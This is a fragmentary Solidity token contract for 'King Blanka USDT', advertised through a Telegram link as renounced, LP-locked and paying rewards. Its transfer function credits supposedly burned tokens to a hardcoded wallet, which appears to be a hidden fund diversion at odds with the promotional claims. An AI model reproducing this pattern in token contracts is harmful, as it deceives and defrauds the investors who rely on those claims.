...
// Submitted for Telegram: https://t.me/kingblanka
// King Blanka Renounced | LP LOCK | Auto Rewards USDT 10%
...
contract  KingBlankaBsc  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "King Blanka USDT";
    string private _symbol = "KIBANK";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x5DF5138C17817B229f1bBE2DF5baA7d02735FbcA] += _bruntoken;
